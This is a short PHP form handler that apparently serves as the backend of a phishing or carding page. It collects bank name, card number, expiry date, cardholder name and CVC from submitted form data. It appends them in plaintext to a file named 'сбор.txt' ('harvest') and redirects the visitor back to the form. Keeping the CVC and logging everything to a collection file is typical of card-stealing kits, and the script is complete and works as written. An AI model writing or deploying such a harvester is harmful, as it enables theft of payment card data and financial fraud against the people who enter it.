<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $bank = $_POST["bank"];
    $card_number = $_POST["card_number"];
    $expiration_month = $_POST["expiration_month"];
    $expiration_year = $_POST["expiration_year"];
    $card_holder_name = $_POST["card_holder_name"];
    $cvc = $_POST["cvc"];

    // Create a string with the form data
    $data = "Bank: $bank\n";
    $data .= "Card Number: $card_number\n";
    $data .= "Expiration Date: $expiration_month / $expiration_year\n";
    $data .= "Card Holder Name: $card_holder_name\n";
    $data .= "CVC2/CVV2: $cvc\n";

    // Write the data to the сбор.txt file
    file_put_contents("сбор.txt", $data, FILE_APPEND);

    // Redirect back to the form or display a success message
    header("Location: your_form_page.html");
    exit();
}
?>
